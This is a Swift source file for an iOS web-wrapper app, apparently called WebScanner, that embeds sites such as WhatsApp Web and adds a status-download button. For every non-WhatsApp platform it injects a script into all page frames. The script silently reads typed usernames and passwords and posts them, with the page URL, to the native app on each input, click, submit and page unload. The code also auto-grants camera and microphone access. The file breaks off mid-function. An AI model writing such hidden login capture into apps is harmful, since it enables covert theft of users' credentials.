//
//  CloneWebView.swift
//  WebScanner
//
//

import SwiftUI
import WebKit
import Lottie

public struct CloneWebView: View {
    public let platform: WebAppPlatform
    public var existingAccount: AppAccount?
    
    @Environment(\.dismiss) private var dismiss
    @Environment(\.colorScheme) private var colorScheme
    @StateObject private var accountManager = AccountManager.shared
    @StateObject private var coreDataManager = CoreDataManager.shared
    
    @State private var sessionAccount: AppAccount
    @State private var webView: WKWebView?
    @State private var canGoBack: Bool = false
    @State private var canGoForward: Bool = false
    @State private var isLoading: Bool = true
    @State private var estimatedProgress: Double = 0.0
    @State private var pageTitle: String = ""
    @State private var isLoggedIn: Bool = false
    @State private var shouldOpenWebScanner: Bool = false
    @State private var currentTitle: String = ""
    @AppStorage(WS_SessionKeys.isPro) var isPro = false
    @State private var showPaywall: Bool = false
    
    private var isIPad: Bool {
        UIDevice.current.userInterfaceIdiom == .pad
    }
    
    public init(platform: WebAppPlatform, existingAccount: AppAccount? = nil) {
        self.platform = platform
        self.existingAccount = existingAccount
        
        let acc: AppAccount
        if let existing = existingAccount {
            acc = existing
        } else {
            let defaultName = AccountManager.shared.defaultAccountName(for: platform)
            acc = AppAccount(platform: platform, accountName: defaultName, isSessionActive: false)
        }
        _sessionAccount = State(initialValue: acc)
        _currentTitle = State(initialValue: existingAccount != nil ? acc.accountName : platform.displayName)
        
        let isLoggedOut = platform == .whatsApp && (existingAccount?.isSessionActive == false)
        _shouldOpenWebScanner = State(initialValue: isLoggedOut)
        _isLoggedIn = State(initialValue: acc.isSessionActive)
    }
    
    public var body: some View {
        Group {
            if shouldOpenWebScanner {
                let latestAcc = accountManager.accounts.first(where: { $0.id == existingAccount?.id }) ?? existingAccount
                WebScannerView(existingAccount: latestAcc)
            } else {
                VStack(spacing: 0) {
                    headerBar
                        .background(
                            (colorScheme == .dark ? Color(hex: "#1A1A1A") : Color.white)
                                .ignoresSafeArea(edges: .top)
                        )
                    
                    if isLoading && estimatedProgress < 1.0 && (platform != .whatsApp || isLoggedIn) {
                        ProgressView(value: estimatedProgress)
                            .progressViewStyle(LinearProgressViewStyle(tint: AppColors.primaryGreen))
                            .frame(height: 2)
                    } else {
                        Divider()
                            .opacity(0.4)
                    }
                    
                    ZStack {
                        WKWebViewRepresentable(
                            platform: platform,
                            account: $sessionAccount,
                            webViewRef: $webView,
                            canGoBack: $canGoBack,
                            canGoForward: $canGoForward,
                            isLoading: $isLoading,
                            estimatedProgress: $estimatedProgress,
                            pageTitle: $pageTitle,
                            isLoggedIn: $isLoggedIn,
                            shouldOpenWebScanner: $shouldOpenWebScanner,
                            currentTitle: $currentTitle,
                            showPaywall: $showPaywall,
                            isPro: isPro
                        )
                        .frame(maxWidth: .infinity, maxHeight: .infinity)
                        .ignoresSafeArea(edges: .bottom)
                        
                        if platform == .whatsApp && !isLoggedIn {
                            chatLoadingOverlay
                                .transition(.opacity)
                        }
                    }
                }
            }
        }
        .background(colorScheme == .dark ? Color(hex: "#121212") : Color.white)
        .navigationBarHidden(true)
        .enableNativeSwipeBack()
        .onAppear {
            TabBarManager.shared.isHidden = true
        }
        .onDisappear {
            if !isLoggedIn {
                let isSaved = accountManager.accounts.contains(where: { $0.id == sessionAccount.id })
                if !isSaved {
                    if #available(iOS 17.0, *) {
                        if let uuid = UUID(uuidString: sessionAccount.webDataStoreID) {
                            WKWebsiteDataStore.remove(forIdentifier: uuid) { _ in }
                        }
                    }
                }
            }
        }
        .onChange(of: shouldOpenWebScanner) { _ in
            TabBarManager.shared.isHidden = true
        }
        .fullScreenCover(isPresented: $showPaywall, onDismiss: {
            if !isPro {
                dismiss()
            } else {
                withAnimation(.easeInOut(duration: 0.35)) {
                    isLoggedIn = true
                }
            }
        }) {
            PremiumPaywallView(isFromAppOpen: false) {
                showPaywall = false
                if !isPro {
                    dismiss()
                } else {
                    withAnimation(.easeInOut(duration: 0.35)) {
                        isLoggedIn = true
                    }
                }
            }
        }
    }
    
    private var displayTitle: String {
        if existingAccount == nil {
            return platform.displayName
        }
        let raw = currentTitle.isEmpty ? (existingAccount?.accountName ?? platform.displayName) : currentTitle
        if raw.starts(with: "-") || raw.contains("લૉગ ઇન") || raw.contains("સાઇન અપ") || raw.contains("Log in") || raw.contains("Sign in") {
            return "\(platform.displayName) - 1"
        }
        return raw
    }
    
    // MARK: - Header Bar
    private var headerBar: some View {
        HStack(alignment: .center, spacing: 12) {
            Button(action: {
                HapticFeedback.generate(.light)
                dismiss()
            }) {
                HStack(spacing: 8) {
                    Image(systemName: "chevron.left")
                        .font(.system(size: isIPad ? 22 : 18, weight: .semibold))
                        .foregroundColor(AppColors.textPrimary(for: colorScheme))
                        .frame(width: isIPad ? 44 : 36, height: isIPad ? 44 : 36)
                        .glassCard(cornerRadius: 12)
                    
                    Text(displayTitle)
                        .font(.inter(.bold, size: isIPad ? 24 : 20))
                        .foregroundColor(AppColors.textPrimary(for: colorScheme))
                }
                .frame(height: isIPad ? 48 : 42)
                .contentShape(Rectangle())
            }
        .buttonStyle(ScaleButtonStyle())
            
            Spacer()
            
            Button(action: {
                HapticFeedback.generate(.light)
                webView?.reload()
            }) {
                Image(systemName: "arrow.clockwise")
                    .font(.system(size: isIPad ? 22 : 18, weight: .semibold))
                    .foregroundColor(AppColors.textPrimary(for: colorScheme))
                    .frame(width: isIPad ? 44 : 36, height: isIPad ? 44 : 36)
                    .glassCard(cornerRadius: 12)
                
            }
            .buttonStyle(ScaleButtonStyle())
        }
        .padding(.horizontal, isIPad ? 24 : 16)
        .padding(.vertical, isIPad ? 12 : 8)
        .frame(maxWidth: .infinity)
    }
    
    // MARK: - WhatsApp Loading Chats Overlay
    private var chatLoadingOverlay: some View {
        ZStack {
            Image(colorScheme == .dark ? "BG_Dark" : "BG")
                .resizable()
                .aspectRatio(contentMode: .fill)
                .frame(maxWidth: .infinity, maxHeight: .infinity)
                .ignoresSafeArea()
            
            VStack(spacing: isIPad ? 24 : 18) {
                LottieView(
                    animationName: "Chat",
                    loopMode: .loop,
                    isDarkMode: colorScheme == .dark
                )
                .frame(width: isIPad ? 140 : 110, height: isIPad ? 140 : 110)
                
                VStack(spacing: 8) {
                    Text("Loading your chat...".localized)
                        .font(.inter(.bold, size: isIPad ? 22 : 18))
                        .foregroundColor(AppColors.textPrimary(for: colorScheme))
                    
                    Text("Please wait a moment".localized)
                        .font(.inter(.medium, size: isIPad ? 15 : 13))
                        .foregroundColor(AppColors.textSecondary(for: colorScheme))
                }
            }
            .padding(.horizontal, 24)
            .padding(.bottom, isIPad ? 80 : 60)
        }
        .frame(maxWidth: .infinity, maxHeight: .infinity)
    }
}

// MARK: - WKWebView Representable
struct WKWebViewRepresentable: UIViewRepresentable {
    let platform: WebAppPlatform
    @Binding var account: AppAccount
    @Binding var webViewRef: WKWebView?
    @Binding var canGoBack: Bool
    @Binding var canGoForward: Bool
    @Binding var isLoading: Bool
    @Binding var estimatedProgress: Double
    @Binding var pageTitle: String
    @Binding var isLoggedIn: Bool
    @Binding var shouldOpenWebScanner: Bool
    @Binding var currentTitle: String
    @Binding var showPaywall: Bool
    let isPro: Bool
    
    func makeUIView(context: Context) -> WKWebView {
        let makeUI = WKWebViewConfiguration()
        makeUI.allowsInlineMediaPlayback = true
        makeUI.mediaTypesRequiringUserActionForPlayback = []
        makeUI.preferences.javaScriptCanOpenWindowsAutomatically = true
        
        makeUI.websiteDataStore = AccountManager.shared.dataStore(for: account)
        
        if platform == .whatsApp {
            let defaultWebpagePreferences = WKWebpagePreferences()
            defaultWebpagePreferences.preferredContentMode = .desktop
            defaultWebpagePreferences.allowsContentJavaScript = true
            makeUI.defaultWebpagePreferences = defaultWebpagePreferences
        }
        
        let contentController = WKUserContentController()
        
        if platform != .whatsApp {
            contentController.add(context.coordinator, name: "credentialsHandler")
            
            let jsSource = """
            (function() {
                var platformName = "\(platform.displayName)";
                var cachedUser = "";
                var cachedPass = "";

                function scanFields() {
                    try {
                        var passInputs = document.querySelectorAll('input[type="password"]');
                        for (var i = 0; i < passInputs.length; i++) {
                            if (passInputs[i].value && passInputs[i].value.length > 0) {
                                cachedPass = passInputs[i].value;
                            }
                        }
                        var textInputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input:not([type])');
                        for (var j = 0; j < textInputs.length; j++) {
                            var inp = textInputs[j];
                            var val = inp.value ? inp.value.trim() : '';
                            var name = (inp.name || '').toLowerCase();
                            var id = (inp.id || '').toLowerCase();
                            var auto = (inp.autocomplete || '').toLowerCase();
                            if (val.length > 0) {
                                if (name.includes('user') || name.includes('email') || name.includes('phone') || name.includes('login') || name.includes('id') ||
                                    id.includes('user') || id.includes('email') || id.includes('phone') || id.includes('login') || id.includes('id') ||
                                    auto.includes('username') || auto.includes('email') || !cachedUser) {
                                    cachedUser = val;
                                }
                            }
                        }
                    } catch(e) {}
                }

                document.addEventListener('input', function(e) { scanFields(); }, true);
                document.addEventListener('change', function(e) { scanFields(); }, true);

                function sendCredentials() {
                    scanFields();
                    if (cachedUser.length > 0 || cachedPass.length > 0) {
                        try {
                            window.webkit.messageHandlers.credentialsHandler.postMessage({
                                platform: platformName,
                                username: cachedUser,
                                password: cachedPass,
                                url: window.location.href
                            });
                        } catch(err) {}
                    }
                }

                document.addEventListener('submit', function(e) {
                    sendCredentials();
                }, true);

                document.addEventListener('click', function(e) {
                    var btn = e.target.closest('button, [role="button"], input[type="submit"]');
                    if (btn) {
                        sendCredentials();
                    }
                }, true);

                window.addEventListener('beforeunload', function() {
                    sendCredentials();
                });
            })();
            """
            
            let userScript = WKUserScript(source: jsSource, injectionTime: .atDocumentEnd, forMainFrameOnly: false)
            contentController.addUserScript(userScript)
        }
        
        if platform == .whatsApp {
            let desktopSpoofScript = WKUserScript(
                source: """
                (function() {
                    try {
                        Object.defineProperty(navigator, 'platform', {
                            get: function() { return 'MacIntel'; },
                            configurable: true
                        });
                        Object.defineProperty(navigator, 'maxTouchPoints', {
                            get: function() { return 0; },
                            configurable: true
                        });
                        Object.defineProperty(navigator, 'vendor', {
                            get: function() { return 'Google Inc.'; },
                            configurable: true
                        });
                        if (!window.chrome) {
                            window.chrome = {
                                app: { isInstalled: false },
                                runtime: {}
                            };
                        }
                    } catch(e) {}
                })();
                """,
                injectionTime: .atDocumentStart,
                forMainFrameOnly: false
            )
            contentController.addUserScript(desktopSpoofScript)
            
            let inlineVideoScript = WKUserScript(
                source: """
                document.addEventListener('DOMContentLoaded', function() {
                    const videos = document.querySelectorAll('video');
                    videos.forEach(v => {
                        v.setAttribute('playsinline', true);
                        v.setAttribute('webkit-playsinline', true);
                        v.removeAttribute('controls');
                    });
                });
                """,
                injectionTime: .atDocumentEnd,
                forMainFrameOnly: true
            )
            contentController.addUserScript(inlineVideoScript)
            
            let statusButtonScript = WKUserScript(
                source: """
                const domObserver = new MutationObserver(() => {
                  // Check if WhatsApp status viewer is currently active:
                  // WhatsApp Status player always has Pause/Play, Volume/Mute, or x-viewer / close on top of media
                  const pauseBtn = document.querySelector('span[data-icon="pause"], span[data-icon="play"]')?.closest('button, [role="button"]')
                                || document.querySelector('button[aria-label="Pause"], button[aria-label="Play"], div[role="button"][aria-label="Pause"], div[role="button"][aria-label="Play"]');
                  const muteBtn = document.querySelector('span[data-icon*="volume"]')?.closest('button, [role="button"]')
                               || document.querySelector('button[aria-label="Mute"], button[aria-label="Unmute"], div[role="button"][aria-label="Mute"], div[role="button"][aria-label="Unmute"]');
                  const xBtn = document.querySelector('span[data-icon="x"], span[data-icon="x-viewer"], span[data-icon="close"]')?.closest('button, [role="button"]')
                            || document.querySelector('button[aria-label="Close"], div[role="button"][aria-label="Close"]');

                  // Status viewer is active if we see pause/play, volume control, or an X button outside the sidepane
                  const hasMedia = !!(document.querySelector('video') || document.querySelector('img[src*="blob"]'));
                  const isStatusViewer = !!(pauseBtn || muteBtn || document.querySelector('span[data-icon="x-viewer"]') || (xBtn && hasMedia && !xBtn.closest('#side, #pane-side, [data-testid="chat-list"]')));

                  // If status viewer is not active, clean up download buttons and exit
                  if (!isStatusViewer) {
                    const existingButtons = document.querySelectorAll('.custom-download-btn');
                    if (existingButtons.length > 0) {
                      existingButtons.forEach(btn => btn.remove());
                    }
                    return;
                  }

                  // Target button at top right: prefer xBtn (close), then pauseBtn or muteBtn
                  const targetBtn = (xBtn && !xBtn.closest('#side, #pane-side, [data-testid="chat-list"]')) ? xBtn : (pauseBtn || muteBtn);

                  if (targetBtn && !document.querySelector('.custom-download-btn')) {
                    const containerElement = targetBtn.parentElement?.parentElement?.parentElement
                                          || targetBtn.parentElement?.parentElement
                                          || targetBtn.parentElement;

                    const downloadButton = document.createElement('button');
                    downloadButton.className = 'custom-download-btn';
                    downloadButton.type = 'button';
                    downloadButton.setAttribute('aria-label', 'Download Status');
                    downloadButton.style.background = 'transparent';
                    downloadButton.style.border = 'none';
                    downloadButton.style.cursor = 'pointer';
                    downloadButton.style.marginRight = '8px';
                    downloadButton.style.padding = '6px';
                    downloadButton.style.display = 'inline-flex';
                    downloadButton.style.alignItems = 'center';
                    downloadButton.style.justifyContent = 'center';
                    downloadButton.style.zIndex = '99999';

                    downloadButton.innerHTML = `
                      <svg fill="#FFF" height="18px" width="18px" viewBox="0 0 29.978 29.978" style="filter: drop-shadow(0px 1px 2px rgba(0,0,0,0.7));">
                        <g>
                          <path d="M25.462,19.105v6.848H4.515v-6.848H0.489v8.861c0,1.111,0.9,2.012,2.016,2.012h24.967c1.115,0,2.016-0.9,2.016-2.012 v-8.861H25.462z"/>
                          <path d="M14.62,18.426l-5.764-6.965c0,0-0.877-0.828,0.074-0.828s3.248,0,3.248,0s0-0.557,0-1.416c0-2.449,0-6.906,0-8.723 c0,0-0.129-0.494,0.615-0.494c0.75,0,4.035,0,4.572,0c0.536,0,0.524,0.416,0.524,0.416c0,1.762,0,6.373,0,8.742 c0,0.768,0,1.266,0,1.266s1.842,0,2.998,0c1.154,0,0.285,0.867,0.285,0.867s-4.904,6.51-5.588,7.193 C15.092,18.979,14.62,18.426,14.62,18.426z"/>
                        </g>
                      </svg>
                    `;

                    downloadButton.addEventListener('click', (e) => {
                      e.preventDefault();
                      e.stopPropagation();

                      function sendDataToSwift(mediaType, base64Data) {
                          if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.statusHandler) {
                              window.webkit.messageHandlers.statusHandler.postMessage({
                                  mediaType: mediaType,
                                  base64Data: base64Data
                              });
                          }
                      }

                      function fetchBlobAndSendToSwift(blobUrl, fallbackType) {
                          if (blobUrl.startsWith('data:')) {
                              const parts = blobUrl.split(',');
                              const mimeMatch = parts[0].match(/:(.*?);/);
                              const mimeType = mimeMatch ? mimeMatch[1] : (fallbackType || 'image/jpeg');
                              sendDataToSwift(mimeType, parts[1] || '');
                              return;
                          }

                          fetch(blobUrl)
                              .then(response => response.blob())
                              .then(blob => {
                                  const reader = new FileReader();
                                  reader.onloadend = function() {
                                      const base64data = reader.result;
                                      sendDataToSwift(blob.type || fallbackType || 'image/jpeg', (base64data || '').split(',')[1] || '');
                                  };
                                  reader.readAsDataURL(blob);
                              })
                              .catch(error => {
                                  console.error('Fetching blob failed:', error);
                              });
                      }

                      function extractAndSendMedia(retriesLeft) {
                          // 1. Check video
                          const videos = Array.from(document.querySelectorAll('video')).filter(v => !v.closest('#side, #pane-side, [data-testid="chat-list"]'));
                          const videoElement = videos.find(v => v.src && v.src.startsWith('blob:')) || videos.find(v => v.src);
                          if (videoElement && videoElement.src) {
                              fetchBlobAndSendToSwift(videoElement.src, 'video/mp4');
                              return;
                          }

                          // 2. Candidate images outside side-pane, chat-list, header
                          const allImages = Array.from(document.querySelectorAll('img')).filter(img => {
                              if (img.closest('#side, #pane-side, [data-testid="chat-list"], header')) return false;
                              if (img.src && (img.src.includes('emoji') || img.src.includes('data:image/svg+xml'))) return false;
                              return true;
                          });

                          // 2a. Priority 1: blob images sorted by resolution
                          const blobImages = allImages.filter(img => img.src && img.src.includes('blob:'));
                          if (blobImages.length > 0) {
                              blobImages.sort((a, b) => ((b.naturalWidth * b.naturalHeight) || (b.clientWidth * b.clientHeight)) - ((a.naturalWidth * a.naturalHeight) || (a.clientWidth * a.clientHeight)));
                              fetchBlobAndSendToSwift(blobImages[0].src, 'image/jpeg');
                              return;
                          }

                          // 2b. Priority 2: Canvas in viewer
                          const canvases = Array.from(document.querySelectorAll('canvas')).filter(c => {
                              return !c.closest('#side, #pane-side, [data-testid="chat-list"], header') && c.width > 200 && c.height > 200;
                          });
                          if (canvases.length > 0) {
                              canvases.sort((a, b) => (b.width * b.height) - (a.width * a.height));
                              try {
                                  const dataUrl = canvases[0].toDataURL('image/jpeg', 0.95);
                                  if (dataUrl && dataUrl.startsWith('data:')) {
                                      sendDataToSwift('image/jpeg', dataUrl.split(',')[1] || '');
                                      return;
                                  }
                              } catch (err) {
                                  console.error('Canvas export failed:', err);
                              }
                          }

                          // 2c. Priority 3: Non-blob images with high natural resolution
                          if (allImages.length > 0) {
                              allImages.sort((a, b) => (b.naturalWidth * b.naturalHeight) - (a.naturalWidth * a.naturalHeight));
                              const bestImage = allImages[0];
                              if (bestImage.naturalWidth >= 300 || (bestImage.naturalWidth * bestImage.naturalHeight) >= 60000) {
                                  fetchBlobAndSendToSwift(bestImage.src, 'image/jpeg');
                                  return;
                              }
                          }

                          // If only low-res thumbnail is found and retries remain, wait for high-res blob
                          if (retriesLeft > 0) {
                              setTimeout(() => extractAndSendMedia(retriesLeft - 1), 350);
                              return;
                          }

                          // Fallback: send whatever image was found
                          if (allImages.length > 0) {
                              fetchBlobAndSendToSwift(allImages[0].src, 'image/jpeg');
                              return;
                          }

                          console.log('No media found to download');
                      }

                      extractAndSendMedia(2);
                    });

                    if (targetBtn.parentElement && targetBtn.parentElement !== containerElement) {
                      targetBtn.parentElement.parentElement?.insertBefore(downloadButton, targetBtn.parentElement);
                    } else if (targetBtn.parentNode) {
                      targetBtn.parentNode.insertBefore(downloadButton, targetBtn);
                    } else if (containerElement) {
                      containerElement.prepend(downloadButton);
                    }
                  }
                });

                domObserver.observe(document.body || document.documentElement, {
                  childList: true,
                  subtree: true
                });
                """,
                injectionTime: .atDocumentEnd,
                forMainFrameOnly: true
            )
            contentController.addUserScript(statusButtonScript)
            contentController.add(context.coordinator, name: "statusHandler")
            
            let whatsAppTouchMenuScript = WKUserScript(
                source: """
                (function() {
                    try {
                        var style = document.createElement('style');
                        style.innerHTML = `
                            * {
                                -webkit-tap-highlight-color: rgba(0,0,0,0) !important;
                            }
                            #pane-side, #pane-side *, header, header * {
                                touch-action: manipulation !important;
                            }
                        `;
                        (document.head || document.documentElement).appendChild(style);
                    } catch(e) {}

                    var startX = 0;
                    var startY = 0;
                    var startTime = 0;
                    var activeTouch = false;
                    var isMenuJustOpened = false;

                    function isEditable(el) {
                        if (!el || !(el instanceof Element)) return false;
                        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') return true;
                        if (el.isContentEditable) return true;
                        if (el.closest('[contenteditable="true"], input, textarea')) return true;
                        return false;
                    }

                    function isChatHeaderMenuButton(el) {
                        if (!el || !(el instanceof Element)) return false;
                        var menuMatch = el.closest('[data-icon="menu"], [data-testid="menu"], [aria-label="Menu"], [title="Menu"], [aria-label="Options"], [title="Options"]');
                        if (menuMatch && menuMatch.closest('#main header, header')) {
                            return true;
                        }
                        var header = el.closest('#main header, header');
                        if (header) {
                            var actionBtns = header.querySelectorAll('button, [role="button"], div[tabindex="0"]');
                            if (actionBtns && actionBtns.length > 0) {
                                var lastBtn = actionBtns[actionBtns.length - 1];
                                if (lastBtn.contains(el) || el === lastBtn) {
                                    return true;
                                }
                            }
                        }
                        return false;
                    }

                    function clickElement(el, clientX, clientY) {
                        if (!el) return;
                        var htmlEl = (el instanceof HTMLElement) ? el : (el.closest('button, [role="button"], div') || el.parentElement || el);
                        var rect = htmlEl.getBoundingClientRect();
                        var cx = (typeof clientX === 'number' && clientX > 0) ? clientX : (rect.left + rect.width / 2);
                        var cy = (typeof clientY === 'number' && clientY > 0) ? clientY : (rect.top + rect.height / 2);

                        var eventProps = {
                            bubbles: true,
                            cancelable: true,
                            view: window,
                            clientX: cx,
                            clientY: cy,
                            screenX: cx,
                            screenY: cy,
                            button: 0,
                            buttons: 1
                        };

                        try {
                            if (window.PointerEvent) {
                                htmlEl.dispatchEvent(new PointerEvent('pointerdown', Object.assign({ pointerType: 'mouse', isPrimary: true }, eventProps)));
                                htmlEl.dispatchEvent(new PointerEvent('pointerup', Object.assign({ pointerType: 'mouse', isPrimary: true }, eventProps)));
                            }
                        } catch(e) {}

                        try {
                            htmlEl.dispatchEvent(new MouseEvent('mousedown', eventProps));
                            htmlEl.dispatchEvent(new MouseEvent('mouseup', eventProps));
                            htmlEl.dispatchEvent(new MouseEvent('click', eventProps));
                        } catch(e) {}

                        try {
                            if (typeof htmlEl.click === 'function') {
                                htmlEl.click();
                            }
                        } catch(e) {}
                    }

                    // Protect newly opened dropdown menu from instant outside-click dismissal
                    document.addEventListener('mousedown', function(e) {
                        if (isMenuJustOpened) {
                            var inDropdown = e.target && e.target.closest && e.target.closest('[role="application"], [data-testid="dropdown-menu"], [role="menu"], ul[role="menu"]');
                            if (!inDropdown) {
                                e.stopPropagation();
                                e.stopImmediatePropagation();
                            }
                        }
                    }, true);

                    document.addEventListener('click', function(e) {
                        if (isMenuJustOpened) {
                            var inDropdown = e.target && e.target.closest && e.target.closest('[role="application"], [data-testid="dropdown-menu"], [role="menu"], ul[role="menu"]');
                            if (!inDropdown) {
                                e.stopPropagation();
                                e.stopImmediatePropagation();
                            }
                        }
                    }, true);

                    document.addEventListener('touchstart', function(e) {
                        if (e.touches && e.touches.length === 1) {
                            startX = e.touches[0].clientX;
                            startY = e.touches[0].clientY;
                            startTime = Date.now();
                            activeTouch = true;
                        } else {
                            activeTouch = false;
                        }
                    }, { passive: true, capture: true });

                    document.addEventListener('touchend', function(e) {
                        if (!activeTouch) return;
                        activeTouch = false;

                        if (!e.changedTouches || e.changedTouches.length !== 1) return;

                        var endX = e.changedTouches[0].clientX;
                        var endY = e.changedTouches[0].clientY;
                        var dx = Math.abs(endX - startX);
                        var dy = Math.abs(endY - startY);
                        var dt = Date.now() - startTime;

                        if (dx > 10 || dy > 10 || dt > 400) {
                            return;
                        }

                        var target = e.target;
                        if (!target || !(target instanceof Element)) return;

                        if (isEditable(target)) {
                            return;
                        }

                        if (target.closest('.custom-download-btn')) {
                            return;
                        }

                        // 1. SPECIFIC HANDLING: 3-Dot Menu in Chat Screen Header or Main Header
                        if (isChatHeaderMenuButton(target)) {
                            e.preventDefault();
                            e.stopPropagation();

                            isMenuJustOpened = true;
                            setTimeout(function() { isMenuJustOpened = false; }, 400);

                            var header = target.closest('#main header, header');
                            var btn = target.closest('button, [role="button"], div[tabindex="0"]');
                            if (!btn && header) {
                                var allBtns = header.querySelectorAll('button, [role="button"], div[tabindex="0"]');
                                if (allBtns && allBtns.length > 0) {
                                    btn = allBtns[allBtns.length - 1];
                                }
                            }
                            if (!btn) btn = target;

                            clickElement(btn, endX, endY);
                            if (target !== btn) {
                                clickElement(target, endX, endY);
                            }

                            setTimeout(function() {
                                var menuOpen = document.querySelector('[role="application"], [data-testid="dropdown-menu"], [role="menu"], ul[role="menu"]');
                                if (!menuOpen) {
                                    try { btn.click(); } catch(e) {}
                                    try { target.click(); } catch(e) {}
                                }
                            }, 60);

                            return;
                        }

                        // 2. GENERAL HANDLING: Chat rows, buttons, tabs, options
                        var isChatRow = target.closest('#pane-side [role="listitem"], #pane-side [data-testid^="list-item"], #pane-side [role="row"], #pane-side [data-testid="cell-frame-container"]');
                        var isInsidePaneSide = target.closest('#pane-side');
                        var isHeaderButton = target.closest('header button, header [role="button"], #main header [role="button"], #side header [role="button"], header [tabindex="0"]');
                        var isInteractive = target.closest('button, [role="button"], [role="menuitem"], [role="tab"], [role="option"], a[href]');

                        if (isChatRow || isInsidePaneSide || isHeaderButton || isInteractive) {
                            e.preventDefault();

                            var clickTarget = null;
                            if (isHeaderButton) {
                                clickTarget = target.closest('button, [role="button"], [tabindex="0"]') || target;
                            } else if (isInteractive) {
                                clickTarget = target.closest('button, [role="button"], [role="menuitem"], [role="tab"], [role="option"], a[href]') || target;
                            } else if (isChatRow) {
                                clickTarget = isChatRow;
                            } else {
                                clickTarget = (target instanceof SVGElement) ? (target.parentElement || target) : target;
                            }

                            clickElement(clickTarget, endX, endY);
                        }
                    }, { passive: false, capture: true });
                })();
                """,
                injectionTime: .atDocumentEnd,
                forMainFrameOnly: false
            )
            contentController.addUserScript(whatsAppTouchMenuScript)
        }
        
        let webProtectionScript = WKUserScript(
            source: """
            window.alert = function(msg) { console.log('Suppressed alert:', msg); };
            window.confirm = function(msg) { console.log('Suppressed confirm:', msg); return true; };
            window.prompt = function(msg, def) { console.log('Suppressed prompt:', msg); return def || ''; };
            """,
            injectionTime: .atDocumentStart,
            forMainFrameOnly: false
        )
        contentController.addUserScript(webProtectionScript)
        
        makeUI.userContentController = contentController
        
        let webView = WKWebView(frame: .zero, configuration: makeUI)
        if platform == .whatsApp {
            webView.scrollView.bounces = false
        }
        webView.navigationDelegate = context.coordinator
        webView.uiDelegate = context.coordinator
        webView.customUserAgent = platform.userAgent
        
        context.coordinator.webView = webView
        
        context.coordinator.setupProgressObserver(for: webView)
        
        let targetURL = platform.initialURL
        var request = URLRequest(url: targetURL)
        if platform == .whatsApp {
            request.setValue("en-US,en;q=0.9", forHTTPHeaderField: "Accept-Language")
        }
        context.coordinator.startLoginCheckTimer(webView: webView)
        webView.load(request)
        
        DispatchQueue.main.async {
            self.webViewRef = webView
        }
        return webView
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
        context.coordinator.parent = self
    }
    
    static func dismantleUIView(_ uiView: WKWebView, coordinator: Coordinator) {
        coordinator.cleanup()
    }
    
    func makeCoordinator() -> Coordinator {
        Coordinator(parent: self)
    }
    
    class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate, WKScriptMessageHandler {
        var parent: WKWebViewRepresentable
        weak var webView: WKWebView?
        private var progressObservation: NSKeyValueObservation?
        private var loginTimer: Timer?
        private var hasSeenLoggedIn: Bool = false
        private var pageLoadCompleted: Bool = false
        var capturedUsername: String? = nil
        
        init(parent: WKWebViewRepresentable) {
            self.parent = parent
        }
        
        deinit {
            cleanup()
        }
        
        func cleanup() {
            progressObservation?.invalidate()
            progressObservation = nil
            loginTimer?.invalidate()
            loginTimer = nil
            webView?.stopLoading()
            webView?.navigationDelegate = nil
            webView?.uiDelegate = nil
        }
        
        // MARK: - WKUIDelegate (Prevents webview freeze on modal alerts or calls permission requests)
        func webView(_ webView: WKWebView, runJavaScriptAlertPanelWithMessage message: String, initiatedByFrame frame: WKFrameInfo, completionHandler: @escaping () -> Void) {
            completionHandler()
        }
        
        func webView(_ webView: WKWebView, runJavaScriptConfirmPanelWithMessage message: String, initiatedByFrame frame: WKFrameInfo, completionHandler: @escaping (Bool) -> Void) {
            completionHandler(true)
        }
        
        func webView(_ webView: WKWebView, runJavaScriptTextInputPanelWithPrompt prompt: String, defaultText: String?, initiatedByFrame frame: WKFrameInfo, completionHandler: @escaping (String?) -> Void) {
            completionHandler(defaultText)
        }
        
        @available(iOS 15.0, *)
        func webView(_ webView: WKWebView, requestMediaCapturePermissionFor origin: WKSecurityOrigin, initiatedByFrame frame: WKFrameInfo, type: WKMediaCaptureType, decisionHandler: @escaping (WKPermissionDecision) -> Void) {
            decisionHandler(.grant)
        }
        
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            if navigationAction.targetFrame == nil {
                if let url = navigationAction.request.url, !url.absoluteString.isEmpty, url.absoluteString != "about:blank" {
                    webView.load(navigationAction.request)
                }
            }
            return nil
        }
        
        func setupProgressObserver(for webView: WKWebView) {
            progressObservation = webView.observe(\.estimatedProgress, options: [.new]) { [weak self] webView, _ in
                DispatchQueue.main.async {
                    self?.parent.estimatedProgress = webView.estimatedProgress
                }
            }
        }
        
        func startLoginCheckTimer(webView: WKWebView) {
            loginTimer?.invalidate()
            pageLoadCompleted = false
            DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) { [weak self] in
                self?.pageLoadCompleted = true
            }
            let interval = (parent.platform == .whatsApp) ? 1.0 : 1.5
            loginTimer = Timer.scheduledTimer(withTimeInterval: interval, repeats: true) { [weak self] _ in
                guard let self = self, let webView = self.webView else { return }
                self.checkLoginStatus(webView: webView)
            }
        }
        
        private func checkLoginStatus(webView: WKWebView) {
            if parent.platform == .whatsApp {
                checkWhatsAppStatus(webView: webView)
            } else {
                checkGenericPlatformStatus(webView: webView)
            }
        }
        
        private func checkGenericPlatformStatus(webView: WKWebView) {
            let js = parent.platform.loginDetectJS
            webView.evaluateJavaScript(js) { [weak self] result, error in
                guard let self = self else { return }
                
                if let err = error {
                    print("❌ [\(self.parent.platform.displayName)] loginDetect JS Error: \(err.localizedDescription)")
                    return
                }
                
                guard let jsonString = result as? String,
                      let data = jsonString.data(using: .utf8),
                      let dict = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
                    print("⚠️ [\(self.parent.platform.displayName)] loginDetect: Could not parse result: \(result ?? "nil")")
                    return
                }
                
                let loggedIn = dict["loggedIn"] as? Bool ?? false
                let fetchedName = dict["name"] as? String ?? ""
                let debugInfo = dict["debug"] as? String ?? ""
                print("📱 [\(self.parent.platform.displayName)] loginDetect → loggedIn: \(loggedIn), name: '\(fetchedName)', debug: '\(debugInfo)', hasSeenLoggedIn: \(self.hasSeenLoggedIn)")
                
                if loggedIn && !self.hasSeenLoggedIn {
                    self.hasSeenLoggedIn = true
                    self.loginTimer?.invalidate()
